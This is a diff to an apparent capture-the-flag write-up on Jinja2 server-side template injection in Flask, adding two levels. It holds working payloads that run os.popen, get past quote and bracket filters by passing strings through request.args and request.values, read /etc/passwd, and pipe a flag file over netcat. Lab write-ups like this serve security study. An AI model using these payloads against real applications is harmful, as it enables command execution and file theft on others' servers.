@@ -77,3 +77,34 @@
 {{ url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444') }}
 ```
 
+### Level 4
+* For this level, it looks like `{{`, `}}`, `{{7 + 7}}`, and `{{7 * '7'}}` all work, but `[` and `]` are blocked 
+* Thus, we can do exactly what we did in level 1:
+
+```python3
+{{ url_for.__globals__.os.popen('cat flag').read() }}
+```
+
+### Level 5
+* For this level, it seems like single and double quotes are blocked
+
+* Luckily for us, flask has another way to pass in arguments as strings without quotes
+	* in fact, it has 6:
+1. request.args.name (GET)
+2. request.cookies.name (COOKIES)
+3. request.headers.name (HEAD)
+4. request.values.name (POST)
+5. request.form.name (POST)
+6. request.environ.name (ENVIRONMENT)
+
+* Here's the payload I used:
+```python3
+{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__['open']('flag').read() }}
+
+{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__[request.args.arg1]('flag').read() }}&arg1=open
+
+
+{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__[request.args.COMMAND](request.args.FILENAME).read() }}&COMMAND=open&FILENAME=flag
+
+{{ ().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read() }} post:arg1=open&arg2=/etc/passwd
+```
